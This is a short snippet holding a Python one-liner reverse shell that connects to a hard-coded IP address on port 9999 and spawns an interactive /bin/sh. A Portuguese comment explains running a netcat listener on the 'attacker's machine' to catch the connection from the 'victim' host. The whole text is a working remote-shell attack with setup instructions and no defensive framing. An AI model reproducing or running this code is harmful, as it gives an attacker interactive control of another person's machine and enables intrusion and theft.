'''
python -c
'import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("200.97.91.226", 9999));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

##Executar na maquina do atacante o seguinte comando
para ficar escutando as conexões do host
da vitima, ou seja, do host na qual queremos
atacar

nc -lvnp 9999
'''